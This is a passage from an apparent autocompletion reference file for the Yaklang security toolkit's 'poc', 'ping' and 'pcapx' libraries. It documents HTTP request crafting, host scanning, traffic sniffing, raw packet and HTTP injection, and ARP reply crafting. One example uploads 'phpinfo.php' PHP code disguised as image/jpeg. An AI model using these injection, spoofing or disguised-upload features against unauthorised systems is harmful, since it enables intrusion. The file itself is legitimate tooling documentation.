              'GetHTTPPacketBody(packet []byte) (body []byte)  doc:GetHTTPPacketBody 是一个辅助函数，用于获取请求报文中的请求体，其返回值为bytes\n\nExample:\n```\npoc.GetHTTPPacketBody(`POST /post HTTP/1.1\nContent-Type: application/json\nCOntent-Length: 7\nHost: pie.dev\n\na=b&c=d`) // 获取请求头，这里为b"a=b&c=d"\n```\n',
          },
          {
            functionName:
              "GetAllHTTPPacketQueryParams(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              "GetAllHTTPPacketQueryParams(packet []byte) (params map[string]string)  doc:GetAllHTTPPacketQueryParams 是一个辅助函数，用于获取请求报文中的所有GET请求参数，其返回值为map[string]string，其中键为参数名，值为参数值\n\nExample:\n```\npoc.GetAllHTTPPacketQueryParams(`GET /get?a=b&c=d HTTP/1.1\nContent-Type: application/json\nHost: pie.dev\n\n`) // 获取所有GET请求参数\n```\n",
          },
          {
            functionName:
              "GetAllHTTPPacketPostParams(${1:packet /*type: []byte*/})",
            document: "",
            definitionStr:
              "GetAllHTTPPacketPostParams(packet []byte) (params map[string]string)  doc:GetAllHTTPPacketPostParams 是一个辅助函数，用于获取请求报文中的所有POST请求参数，其返回值为map[string]string，其中键为参数名，值为参数值\n\nExample:\n```\npoc.GetAllHTTPPacketPostParams(`POST /post HTTP/1.1\nContent-Type: application/json\nCOntent-Length: 7\nHost: pie.dev\n\na=b&c=d`) // 获取所有POST请求参数\n```\n",
          },
          {
            functionName: "Get(${1:urlStr /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Get(urlStr string, opts ...PocConfigOption) (rspInst *lowhttp.LowhttpResponse, reqInst *http.Request, err error)  doc:Get 向指定 URL 发送 GET 请求并且返回响应结构体，请求结构体以及错误，它的第一个参数是 URL 字符串，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如对设置超时时间，或者修改请求报文等\n\n关于结构体中的可用字段和方法可以使用 desc 函数进行查看\n\nExample:\n```\npoc.Get("https://yaklang.com", poc.https(true)) // 向yaklang.com发送一个基于HTTPS协议的GET请求\ndesc(rsp) // 查看响应结构体中的可用字段\n```\n',
          },
          {
            functionName: "FixHTTPResponse(${1:r /*type: []byte*/})",
            document: "",
            definitionStr:
              'FixHTTPResponse(r []byte) []byte  doc:FixHTTPResponse 尝试对传入的 HTTP 响应报文进行修复，并返回修复后的响应\n\nExample:\n```\npoc.FixHTTPResponse(b"HTTP/1.1 200 OK\\nContent-Length: 5\\n\\nhello")\n```\n',
          },
          {
            functionName: "FixHTTPRequest(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              'FixHTTPRequest(raw []byte) []byte  doc:FixHTTPRequest 尝试对传入的HTTP请求报文进行修复，并返回修复后的请求\n\nExample:\n```\npoc.FixHTTPRequest(b"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")\n```\n',
          },
          {
            functionName:
              "FixHTTPPacketCRLF(${1:raw /*type: []byte*/}, ${2:noFixLength /*type: bool*/})",
            document: "",
            definitionStr:
              "FixHTTPPacketCRLF(raw []byte, noFixLength bool) []byte  doc:FixHTTPPacketCRLF 修复一个HTTP报文的CRLF问题（正常的报文每行末尾为\\r\\n，但是某些报文可能是有\\n），如果noFixLength为true，则不会修复Content-Length，否则会尝试修复Content-Length\n\nExample:\n```\npoc.FixHTTPPacketCRLF(`POST / HTTP/1.1\nHost: example.com\nContent-Length: 11\n\nhello world`, false)\n```\n",
          },
          {
            functionName: "ExtractPostParams(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              'ExtractPostParams(raw []byte) (map[string]string, error)  doc:ExtractPostParams 尝试将 HTTP 请求报文中的各种 POST 参数(普通格式，表单格式，JSON格式，XML格式)提取出来，返回提取出来的 POST 参数与错误\n\nExample:\n```\nparams, err = poc.ExtractPostParams("POST / HTTP/1.1\\r\\nContent-Type: application/json\\r\\nHost: example.com\\r\\n\\r\\n{\\"key\\": \\"value\\"}")\ndump(params) // {"key": "value"}\n```\n',
          },
          {
            functionName:
              "Do(${1:method /*type: string*/}, ${2:urlStr /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'Do(method string, urlStr string, opts ...PocConfigOption) (rspInst *lowhttp.LowhttpResponse, reqInst *http.Request, err error)  doc:Do 向指定 URL 发送指定请求方法的请求并且返回响应结构体，请求结构体以及错误，它的是第一个参数是请求方法，第二个参数 URL 字符串，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如设置超时时间，或者修改请求报文等\n\n关于结构体中的可用字段和方法可以使用 desc 函数进行查看\n\nExample:\n```\npoc.Do("GET","https://yaklang.com", poc.https(true)) // 向yaklang.com发送一个基于HTTPS协议的GET请求\ndesc(rsp) // 查看响应结构体中的可用字段\n```\n',
          },
          {
            functionName:
              "DeleteHTTPPacketQueryParam(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'DeleteHTTPPacketQueryParam(packet []byte, key string) []byte  doc:DeleteHTTPPacketQueryParam 是一个辅助函数，用于改变请求报文，删除GET请求参数\n\nExample:\n```\npoc.DeleteHTTPPacketQueryParam(`GET /get?a=b&c=d HTTP/1.1\nContent-Type: application/json\nHost: pie.dev\n\n`, "a") // 删除GET请求参数a\n```\n',
          },
          {
            functionName:
              "DeleteHTTPPacketPostParam(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'DeleteHTTPPacketPostParam(packet []byte, key string) []byte  doc:DeleteHTTPPacketPostParam 是一个辅助函数，用于改变请求报文，删除POST请求参数\n\nExample:\n```\npoc.DeleteHTTPPacketPostParam(`POST /post HTTP/1.1\nContent-Type: application/json\nContent-Length: 7\nHost: pie.dev\n\na=b&c=d`, "a") // 删除POST请求参数a\n```\n',
          },
          {
            functionName:
              "DeleteHTTPPacketHeader(${1:packet /*type: []byte*/}, ${2:headerKey /*type: string*/})",
            document: "",
            definitionStr:
              'DeleteHTTPPacketHeader(packet []byte, headerKey string) []byte  doc:DeleteHTTPPacketHeader 是一个辅助函数，用于改变请求报文，删除请求头\n\nExample:\n```\npoc.DeleteHTTPPacketHeader(`GET /get HTTP/1.1\nContent-Type: application/json\nAAA: BBB\nHost: pie.dev\n\n`, "AAA") // 删除AAA请求头\n```\n',
          },
          {
            functionName:
              "DeleteHTTPPacketForm(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'DeleteHTTPPacketForm(packet []byte, key string) []byte  doc:DeleteHTTPPacketForm 是一个辅助函数，用于改变请求报文，删除POST请求表单\n\nExample:\n```\npoc.DeleteHTTPPacketForm(`POST /post HTTP/1.1\nHost: pie.dev\nContent-Type: multipart/form-data; boundary=------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Length: 308\n\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Disposition: form-data; name="aaa"\n\nbbb\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Disposition: form-data; name="ccc"\n\nddd\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm--`, "aaa") // 删除POST请求表单aaa\n```\n',
          },
          {
            functionName:
              "DeleteHTTPPacketCookie(${1:packet /*type: []byte*/}, ${2:key /*type: string*/})",
            document: "",
            definitionStr:
              'DeleteHTTPPacketCookie(packet []byte, key string) []byte  doc:DeleteHTTPPacketCookie 是一个辅助函数，用于改变请求报文，删除Cookie中的值\n\nExample:\n```\npoc.DeleteHTTPPacketCookie(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: aaa=bbb; ccc=ddd\nHost: pie.dev\n\n`, "aaa") // 删除Cookie中的aaa\n```\n',
          },
          {
            functionName: "Delete(${1:urlStr /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Delete(urlStr string, opts ...PocConfigOption) (rspInst *lowhttp.LowhttpResponse, reqInst *http.Request, err error)  doc:Delete 向指定 URL 发送 DELETE 请求并且返回响应结构体，请求结构体以及错误，它的第一个参数是 URL 字符串，接下来可以接收零个到多个请求选项，用于对此次请求进行配置，例如对设置超时时间，或者修改请求报文等\n\n关于结构体中的可用字段和方法可以使用 desc 函数进行查看\n\nExample:\n```\npoc.Delete("https://yaklang.com", poc.https(true)) // 向yaklang.com发送一个基于HTTPS协议的DELETE请求\ndesc(rsp) // 查看响应结构体中的可用字段\n```\n',
          },
          {
            functionName: "CurlToHTTPRequest(${1:command /*type: string*/})",
            document: "",
            definitionStr:
              "CurlToHTTPRequest(command string) (req []byte)  doc:CurlToHTTPRequest 尝试将curl命令转换为HTTP请求报文，其返回值为bytes，即转换后的HTTP请求报文\n\nExample:\n```\npoc.CurlToHTTPRequest(\"curl -X POST -d 'a=b&c=d' http://example.com\")\n```\n",
          },
          {
            functionName: "BuildRequest(${1:i}, ${2:opts...})",
            document: "",
            definitionStr:
              'BuildRequest(i any, opts ...PocConfigOption) []byte  doc:BuildRequest 是一个用于辅助构建请求报文的工具函数，它第一个参数可以接收 []byte, string, http.Request 结构体，接下来可以接收零个到多个请求选项，修改请求报文的选项将被作用，最后返回构建好的请求报文\n\nExample:\n```\nraw = poc.BuildRequest(poc.BasicRequest(), poc.https(true), poc.replaceHost("yaklang.com"), poc.replacePath("/docs/api/poc")) // 构建一个基础GET请求，修改其Host为yaklang.com，访问的URI路径为/docs/api/poc\n// raw = b"GET /docs/api/poc HTTP/1.1\\r\\nHost: www.yaklang.com\\r\\n\\r\\n"\n```\n',
          },
          {
            functionName: "BasicResponse()",
            document: "",
            definitionStr: "BasicResponse() basicResponse",
          },
          {
            functionName: "BasicRequest()",
            document: "",
            definitionStr: "BasicRequest() basicRequest",
          },
          {
            functionName:
              "AppendHTTPPacketUploadFile(${1:packet /*type: []byte*/}, ${2:fieldName /*type: string*/}, ${3:fileName /*type: string*/}, ${4:fileContent}, ${5:contentType...})",
            document: "",
            definitionStr:
              'AppendHTTPPacketUploadFile(packet []byte, fieldName string, fileName string, fileContent any, contentType ...string) []byte  doc:AppendHTTPPacketUploadFile 是一个辅助函数，用于改变请求报文，添加请求体中的上传的文件，其中第一个参数为原始请求报文，第二个参数为表单名，第三个参数为文件名，第四个参数为文件内容，第五个参数是可选参数，为文件类型(Content-Type)\n\nExample:\n```\n_, raw, _ = poc.ParseUrlToHTTPRequestRaw("POST", "https://pie.dev/post")\npoc.AppendHTTPPacketUploadFile(raw, "file", "phpinfo.php", "<?php phpinfo(); ?>", "image/jpeg")) // 添加POST请求表单，其文件名为phpinfo.php，内容为<?php phpinfo(); ?>，文件类型为image/jpeg\n```\n',
          },
          {
            functionName:
              "AppendHTTPPacketQueryParam(${1:packet /*type: []byte*/}, ${2:key /*type: string*/}, ${3:value /*type: string*/})",
            document: "",
            definitionStr:
              'AppendHTTPPacketQueryParam(packet []byte, key string, value string) []byte  doc:AppendHTTPPacketQueryParam 是一个辅助函数，用于改变请求报文，添加GET请求参数\n\nExample:\n```\npoc.AppendHTTPPacketQueryParam(poc.BasicRequest(), "a", "b") // 添加GET请求参数a，值为b\n```\n',
          },
          {
            functionName:
              "AppendHTTPPacketPostParam(${1:packet /*type: []byte*/}, ${2:key /*type: string*/}, ${3:value /*type: string*/})",
            document: "",
            definitionStr:
              'AppendHTTPPacketPostParam(packet []byte, key string, value string) []byte  doc:AppendHTTPPacketPostParam 是一个辅助函数，用于改变请求报文，添加POST请求参数\n\nExample:\n```\npoc.AppendHTTPPacketPostParam(poc.BasicRequest(), "a", "b") // 向 pie.dev 发起请求，添加POST请求参数a，值为b\n```\n',
          },
          {
            functionName:
              "AppendHTTPPacketPath(${1:packet /*type: []byte*/}, ${2:p /*type: string*/})",
            document: "",
            definitionStr:
              'AppendHTTPPacketPath(packet []byte, p string) []byte  doc:AppendHTTPPacketPath 是一个辅助函数，用于改变请求报文，在现有请求路径后添加请求路径\n\nExample:\n```\npoc.AppendHTTPPacketPath(`GET /docs HTTP/1.1\nHost: yaklang.com\n`, "/api/poc")) // 向 example.com 发起请求，实际上请求路径改为/docs/api/poc\n```\n',
          },
          {
            functionName:
              "AppendHTTPPacketHeader(${1:packet /*type: []byte*/}, ${2:headerKey /*type: string*/}, ${3:headerValue})",
            document: "",
            definitionStr:
              'AppendHTTPPacketHeader(packet []byte, headerKey string, headerValue any) []byte  doc:AppendHTTPPacketHeader 是一个辅助函数，用于改变请求报文，添加请求头\n\nExample:\n```\npoc.AppendHTTPPacketHeader(poc.BasicRequest(), "AAA", "BBB") // 添加AAA请求头的值为BBB\n```\n',
          },
          {
            functionName:
              "AppendHTTPPacketFormEncoded(${1:packet /*type: []byte*/}, ${2:key /*type: string*/}, ${3:value /*type: string*/})",
            document: "",
            definitionStr:
              'AppendHTTPPacketFormEncoded(packet []byte, key string, value string) []byte  doc:AppendHTTPPacketFormEncoded 是一个辅助函数，用于改变请求报文，添加请求体中的表单\n\nExample:\n```\npoc.AppendHTTPPacketFormEncoded(`POST /post HTTP/1.1\nHost: pie.dev\nContent-Type: multipart/form-data; boundary=------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Length: 203\n\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Disposition: form-data; name="aaa"\n\nbbb\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm--`, "ccc", "ddd") // 添加POST请求表单，其中ccc为键，ddd为值\n```\n',
          },
          {
            functionName:
              "AppendHTTPPacketCookie(${1:packet /*type: []byte*/}, ${2:key /*type: string*/}, ${3:value})",
            document: "",
            definitionStr:
              'AppendHTTPPacketCookie(packet []byte, key string, value any) []byte  doc:AppendHTTPPacketCookie 是一个辅助函数，用于改变请求报文，添加Cookie请求头中的值\n\nExample:\n```\npoc.AppendHTTPPacketCookie(poc.BasicRequest(), "aaa", "bbb") // 添加cookie键值对aaa:bbb\n```\n',
          },
        ],
      },
      {
        libName: "ping",
        prefix: "ping.",
        functions: [
          {
            functionName: "timeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr: "timeout(i float64) _pingConfigOpt",
          },
          {
            functionName: "tcpPingPorts(${1:i /*type: string*/})",
            document: "",
            definitionStr: "tcpPingPorts(i string) _pingConfigOpt",
          },
          {
            functionName: "skip(${1:i /*type: bool*/})",
            document: "",
            definitionStr: "skip(i bool) _pingConfigOpt",
          },
          {
            functionName: "scanCClass(${1:i /*type: bool*/})",
            document: "",
            definitionStr: "scanCClass(i bool) _pingConfigOpt",
          },
          {
            functionName: "proxy(${1:i...})",
            document: "",
            definitionStr: "proxy(i ...string) _pingConfigOpt",
          },
          {
            functionName:
              "onResult(${1:i /*type: func(result *pingutil.PingResult)*/})",
            document: "",
            definitionStr:
              "onResult(i func(result *pingutil.PingResult)) _pingConfigOpt",
          },
          {
            functionName: "excludeHosts(${1:host /*type: string*/})",
            document: "",
            definitionStr: "excludeHosts(host string) _pingConfigOpt",
          },
          {
            functionName: "dnsTimeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr: "dnsTimeout(i float64) _pingConfigOpt",
          },
          {
            functionName: "dnsServers(${1:i...})",
            document: "",
            definitionStr: "dnsServers(i ...string) _pingConfigOpt",
          },
          {
            functionName: "concurrent(${1:i /*type: int*/})",
            document: "",
            definitionStr: "concurrent(i int) _pingConfigOpt",
          },
          {
            functionName: "Scan(${1:target /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "Scan(target string, opts ..._pingConfigOpt) chan *pingutil.PingResult",
          },
          {
            functionName: "Ping(${1:target /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "Ping(target string, opts ..._pingConfigOpt) *pingutil.PingResult",
          },
        ],
      },
      {
        libName: "pcapx",
        prefix: "pcapx.",
        functions: [
          {
            functionName: "udp_srcPort(${1:in})",
            document: "",
            definitionStr: "udp_srcPort(in any) UDPOption",
          },
          {
            functionName: "udp_dstPort(${1:in})",
            document: "",
            definitionStr: "udp_dstPort(in any) UDPOption",
          },
          {
            functionName: "tcp_window(${1:window})",
            document: "",
            definitionStr: "tcp_window(window any) TCPOption",
          },
          {
            functionName: "tcp_urgent(${1:urgent})",
            document: "",
            definitionStr: "tcp_urgent(urgent any) TCPOption",
          },
          {
            functionName: "tcp_srcPort(${1:srcPort})",
            document: "",
            definitionStr: "tcp_srcPort(srcPort any) TCPOption",
          },
          {
            functionName: "tcp_seq(${1:seq})",
            document: "",
            definitionStr: "tcp_seq(seq any) TCPOption",
          },
          {
            functionName: "tcp_optionWindowScale(${1:i})",
            document: "",
            definitionStr: "tcp_optionWindowScale(i any) TCPOption",
          },
          {
            functionName: "tcp_optionTimestamp(${1:i})",
            document: "",
            definitionStr: "tcp_optionTimestamp(i any) TCPOption",
          },
          {
            functionName: "tcp_optionSACKPermitted()",
            document: "",
            definitionStr: "tcp_optionSACKPermitted() TCPOption",
          },
          {
            functionName: "tcp_optionSACK(${1:i...})",
            document: "",
            definitionStr: "tcp_optionSACK(i ...any) TCPOption",
          },
          {
            functionName:
              "tcp_optionRaw(${1:optionType}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr: "tcp_optionRaw(optionType any, data []byte) TCPOption",
          },
          {
            functionName: "tcp_optionMSS(${1:i})",
            document: "",
            definitionStr:
              "tcp_optionMSS(i any) TCPOption  doc:WithTCP_OptionMSS is a IPv4Option default 1460\n",
          },
          {
            functionName: "tcp_flag(${1:in})",
            document: "",
            definitionStr: "tcp_flag(in any) TCPOption",
          },
          {
            functionName: "tcp_dstPort(${1:dstPort})",
            document: "",
            definitionStr: "tcp_dstPort(dstPort any) TCPOption",
          },
          {
            functionName: "tcp_dataOffset(${1:dataOffset})",
            document: "",
            definitionStr: "tcp_dataOffset(dataOffset any) TCPOption",
          },
          {
            functionName: "tcp_ack(${1:ack})",
            document: "",
            definitionStr: "tcp_ack(ack any) TCPOption",
          },
          {
            functionName:
              "pcap_onTLSClientHello(${1:h /*type: func(flow *TrafficFlow, hello *tlsutils.HandshakeClientHello)*/})",
            document: "",
            definitionStr:
              "pcap_onTLSClientHello(h func(flow *TrafficFlow, hello *tlsutils.HandshakeClientHello)) CaptureOption",
          },
          {
            functionName:
              "pcap_onHTTPRequest(${1:h /*type: func(flow *TrafficFlow, req *http.Request)*/})",
            document: "",
            definitionStr:
              "pcap_onHTTPRequest(h func(flow *TrafficFlow, req *http.Request)) CaptureOption",
          },
          {
            functionName:
              "pcap_onHTTPFlow(${1:h /*type: func(flow *TrafficFlow, req *http.Request, rsp *http.Response)*/})",
            document: "",
            definitionStr:
              "pcap_onHTTPFlow(h func(flow *TrafficFlow, req *http.Request, rsp *http.Response)) CaptureOption",
          },
          {
            functionName:
              "pcap_onFlowDataFrameNoReassembled(${1:h /*type: func(flow *TrafficFlow, conn *TrafficConnection, frame *TrafficFrame)*/})",
            document: "",
            definitionStr:
              "pcap_onFlowDataFrameNoReassembled(h func(flow *TrafficFlow, conn *TrafficConnection, frame *TrafficFrame)) CaptureOption",
          },
          {
            functionName:
              "pcap_onFlowDataFrame(${1:h /*type: func(flow *TrafficFlow, conn *TrafficConnection, frame *TrafficFrame)*/})",
            document: "",
            definitionStr:
              "pcap_onFlowDataFrame(h func(flow *TrafficFlow, conn *TrafficConnection, frame *TrafficFrame)) CaptureOption",
          },
          {
            functionName:
              "pcap_onFlowCreated(${1:h /*type: func(flow *TrafficFlow)*/})",
            document: "",
            definitionStr:
              "pcap_onFlowCreated(h func(flow *TrafficFlow)) CaptureOption",
          },
          {
            functionName:
              "pcap_onFlowClosed(${1:h /*type: func(reason TrafficFlowCloseReason, flow *TrafficFlow)*/})",
            document: "",
            definitionStr:
              "pcap_onFlowClosed(h func(reason TrafficFlowCloseReason, flow *TrafficFlow)) CaptureOption",
          },
          {
            functionName:
              "pcap_everyPacket(${1:h /*type: func(packet gopacket.Packet)*/})",
            document: "",
            definitionStr:
              "pcap_everyPacket(h func(packet gopacket.Packet)) CaptureOption",
          },
          {
            functionName: "pcap_disableAssembly(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "pcap_disableAssembly(b bool) CaptureOption",
          },
          {
            functionName: "pcap_debug(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "pcap_debug(b bool) CaptureOption",
          },
          {
            functionName: "pcap_bpfFilter(${1:bpf /*type: string*/})",
            document: "",
            definitionStr: "pcap_bpfFilter(bpf string) CaptureOption",
          },
          {
            functionName: "loopback_payload(${1:payload /*type: []byte*/})",
            document: "",
            definitionStr: "loopback_payload(payload []byte) LoopbackOption",
          },
          {
            functionName: "loopback_family(${1:i})",
            document: "",
            definitionStr: "loopback_family(i any) LoopbackOption",
          },
          {
            functionName: "ipv4_ttl(${1:i})",
            document: "",
            definitionStr: "ipv4_ttl(i any) IPv4Option",
          },
          {
            functionName: "ipv4_tos(${1:i})",
            document: "",
            definitionStr: "ipv4_tos(i any) IPv4Option",
          },
          {
            functionName: "ipv4_srcIp(${1:i})",
            document: "",
            definitionStr: "ipv4_srcIp(i any) IPv4Option",
          },
          {
            functionName: "ipv4_option(${1:optType}, ${2:data /*type: []byte*/})",
            document: "",
            definitionStr: "ipv4_option(optType any, data []byte) IPv4Option",
          },
          {
            functionName: "ipv4_nextLayerProtocol(${1:i})",
            document: "",
            definitionStr: "ipv4_nextLayerProtocol(i any) IPv4Option",
          },
          {
            functionName: "ipv4_id(${1:i})",
            document: "",
            definitionStr: "ipv4_id(i any) IPv4Option",
          },
          {
            functionName: "ipv4_fragment(${1:i})",
            document: "",
            definitionStr: "ipv4_fragment(i any) IPv4Option",
          },
          {
            functionName: "ipv4_flags(${1:i})",
            document: "",
            definitionStr: "ipv4_flags(i any) IPv4Option",
          },
          {
            functionName: "ipv4_dstOp(${1:i})",
            document: "",
            definitionStr: "ipv4_dstOp(i any) IPv4Option",
          },
          {
            functionName: "icmp_type(${1:icmpType}, ${2:icmpCode})",
            document: "",
            definitionStr: "icmp_type(icmpType any, icmpCode any) ICMPOption",
          },
          {
            functionName: "icmp_seq(${1:sequence})",
            document: "",
            definitionStr: "icmp_seq(sequence any) ICMPOption",
          },
          {
            functionName: "icmp_payload(${1:i /*type: []byte*/})",
            document: "",
            definitionStr: "icmp_payload(i []byte) ICMPOption",
          },
          {
            functionName: "icmp_id(${1:id})",
            document: "",
            definitionStr: "icmp_id(id any) ICMPOption",
          },
          {
            functionName: "ethernet_srcMac(${1:srcMac})",
            document: "",
            definitionStr: "ethernet_srcMac(srcMac any) EthernetOption",
          },
          {
            functionName: "ethernet_nextLayerType(${1:i})",
            document: "",
            definitionStr: "ethernet_nextLayerType(i any) EthernetOption",
          },
          {
            functionName: "ethernet_dstMac(${1:dstMac})",
            document: "",
            definitionStr: "ethernet_dstMac(dstMac any) EthernetOption",
          },
          {
            functionName:
              "arp_requestEx(${1:selfIP /*type: string*/}, ${2:selfMac /*type: string*/}, ${3:remoteIP /*type: string*/})",
            document: "",
            definitionStr:
              "arp_requestEx(selfIP string, selfMac string, remoteIP string) ArpConfig",
          },
          {
            functionName: "arp_request(${1:ip /*type: string*/})",
            document: "",
            definitionStr: "arp_request(ip string) ArpConfig",
          },
          {
            functionName:
              "arp_replyEx(${1:srcTarget /*type: string*/}, ${2:srcMac /*type: string*/}, ${3:targetIp /*type: string*/}, ${4:targetMac /*type: string*/})",
            document: "",
            definitionStr:
              "arp_replyEx(srcTarget string, srcMac string, targetIp string, targetMac string) ArpConfig",
          },
          {
            functionName:
              "arp_reply(${1:targetIp /*type: string*/}, ${2:targetMac /*type: string*/})",
            document: "",
            definitionStr:
              "arp_reply(targetIp string, targetMac string) ArpConfig",
          },
          {
            functionName: "TCP_FLAG_URG",
            document: "pcapx.TCP_FLAG_URG: int = 0x20",
            definitionStr: "pcapx.TCP_FLAG_URG: int = 0x20",
          },
          {
            functionName: "TCP_FLAG_SYN",
            document: "pcapx.TCP_FLAG_SYN: int = 0x2",
            definitionStr: "pcapx.TCP_FLAG_SYN: int = 0x2",
          },
          {
            functionName: "TCP_FLAG_RST",
            document: "pcapx.TCP_FLAG_RST: int = 0x4",
            definitionStr: "pcapx.TCP_FLAG_RST: int = 0x4",
          },
          {
            functionName: "TCP_FLAG_PSH",
            document: "pcapx.TCP_FLAG_PSH: int = 0x8",
            definitionStr: "pcapx.TCP_FLAG_PSH: int = 0x8",
          },
          {
            functionName: "TCP_FLAG_NS",
            document: "pcapx.TCP_FLAG_NS: int = 0x100",
            definitionStr: "pcapx.TCP_FLAG_NS: int = 0x100",
          },
          {
            functionName: "TCP_FLAG_FIN",
            document: "pcapx.TCP_FLAG_FIN: int = 0x1",
            definitionStr: "pcapx.TCP_FLAG_FIN: int = 0x1",
          },
          {
            functionName: "TCP_FLAG_ECE",
            document: "pcapx.TCP_FLAG_ECE: int = 0x40",
            definitionStr: "pcapx.TCP_FLAG_ECE: int = 0x40",
          },
          {
            functionName: "TCP_FLAG_CWR",
            document: "pcapx.TCP_FLAG_CWR: int = 0x80",
            definitionStr: "pcapx.TCP_FLAG_CWR: int = 0x80",
          },
          {
            functionName: "TCP_FLAG_ACK",
            document: "pcapx.TCP_FLAG_ACK: int = 0x10",
            definitionStr: "pcapx.TCP_FLAG_ACK: int = 0x10",
          },
          {
            functionName: "StartSniff(${1:iface /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "StartSniff(iface string, opts ...CaptureOption) error",
          },
          {
            functionName:
              "OpenPcapFile(${1:filename /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "OpenPcapFile(filename string, opts ...CaptureOption) error",
          },
          {
            functionName: "InjectTCP(${1:raw /*type: []byte*/}, ${2:opt...})",
            document: "",
            definitionStr: "InjectTCP(raw []byte, opt ...ConfigOption)",
          },
          {
            functionName: "InjectRaw(${1:raw /*type: []byte*/}, ${2:opt...})",
            document: "",
            definitionStr: "InjectRaw(raw []byte, opt ...ConfigOption)",
          },
          {
            functionName: "InjectIP(${1:raw /*type: []byte*/}, ${2:opt...})",
            document: "",
            definitionStr: "InjectIP(raw []byte, opt ...ConfigOption)",
          },
          {
            functionName:
              "InjectHTTPRequest(${1:raw /*type: []byte*/}, ${2:opt...})",
            document: "",
            definitionStr: "InjectHTTPRequest(raw []byte, opt ...ConfigOption)",
          },
          {
            functionName:
              "InjectChaosTraffic(${1:t /*type: *ChaosTraffic*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "InjectChaosTraffic(t *ChaosTraffic, opts ...ConfigOption)",
          },
          {
            functionName: "IPV4_PROTOCOL_VRRP",
            document: "pcapx.IPV4_PROTOCOL_VRRP: int = 0x70",
            definitionStr: "pcapx.IPV4_PROTOCOL_VRRP: int = 0x70",
          },
          {
            functionName: "IPV4_PROTOCOL_UDPLITE",
            document: "pcapx.IPV4_PROTOCOL_UDPLITE: int = 0x88",
            definitionStr: "pcapx.IPV4_PROTOCOL_UDPLITE: int = 0x88",
          },
          {
            functionName: "IPV4_PROTOCOL_UDP",
            document: "pcapx.IPV4_PROTOCOL_UDP: int = 0x11",
            definitionStr: "pcapx.IPV4_PROTOCOL_UDP: int = 0x11",
          },
          {
            functionName: "IPV4_PROTOCOL_TCP",
            document: "pcapx.IPV4_PROTOCOL_TCP: int = 0x6",
            definitionStr: "pcapx.IPV4_PROTOCOL_TCP: int = 0x6",
          },
          {
            functionName: "IPV4_PROTOCOL_SCTP",
            document: "pcapx.IPV4_PROTOCOL_SCTP: int = 0x84",
            definitionStr: "pcapx.IPV4_PROTOCOL_SCTP: int = 0x84",
          },
          {
            functionName: "IPV4_PROTOCOL_OSPF",
            document: "pcapx.IPV4_PROTOCOL_OSPF: int = 0x59",
            definitionStr: "pcapx.IPV4_PROTOCOL_OSPF: int = 0x59",
          },
          {
            functionName: "IPV4_PROTOCOL_MPLSINIP",
            document: "pcapx.IPV4_PROTOCOL_MPLSINIP: int = 0x89",
            definitionStr: "pcapx.IPV4_PROTOCOL_MPLSINIP: int = 0x89",
          },
          {
            functionName: "IPV4_PROTOCOL_IPIP",
            document: "pcapx.IPV4_PROTOCOL_IPIP: int = 0x5e",
            definitionStr: "pcapx.IPV4_PROTOCOL_IPIP: int = 0x5e",
          },
          {
            functionName: "IPV4_PROTOCOL_IGMP",
            document: "pcapx.IPV4_PROTOCOL_IGMP: int = 0x2",
            definitionStr: "pcapx.IPV4_PROTOCOL_IGMP: int = 0x2",
          },
          {
            functionName: "IPV4_PROTOCOL_ICMP",
            document: "pcapx.IPV4_PROTOCOL_ICMP: int = 0x1",
            definitionStr: "pcapx.IPV4_PROTOCOL_ICMP: int = 0x1",
          },
          {
            functionName: "IPV4_PROTOCOL_GRE",
            document: "pcapx.IPV4_PROTOCOL_GRE: int = 0x2f",
            definitionStr: "pcapx.IPV4_PROTOCOL_GRE: int = 0x2f",
          },
          {
            functionName: "IPV4_PROTOCOL_ETHERIP",
            document: "pcapx.IPV4_PROTOCOL_ETHERIP: int = 0x61",
            definitionStr: "pcapx.IPV4_PROTOCOL_ETHERIP: int = 0x61",
          },
          {
            functionName: "IPV4_PROTOCOL_ESP",
            document: "pcapx.IPV4_PROTOCOL_ESP: int = 0x32",
            definitionStr: "pcapx.IPV4_PROTOCOL_ESP: int = 0x32",
          },
          {
            functionName: "IPV4_PROTOCOL_AH",
            document: "pcapx.IPV4_PROTOCOL_AH: int = 0x33",
            definitionStr: "pcapx.IPV4_PROTOCOL_AH: int = 0x33",
          },
          {
            functionName: "IPV4_FLAG_MORE_FRAGMENT",
            document: "pcapx.IPV4_FLAG_MORE_FRAGMENT: int = 0x1",
            definitionStr: "pcapx.IPV4_FLAG_MORE_FRAGMENT: int = 0x1",
          },
          {
            functionName: "IPV4_FLAG_EVIL_BIT",
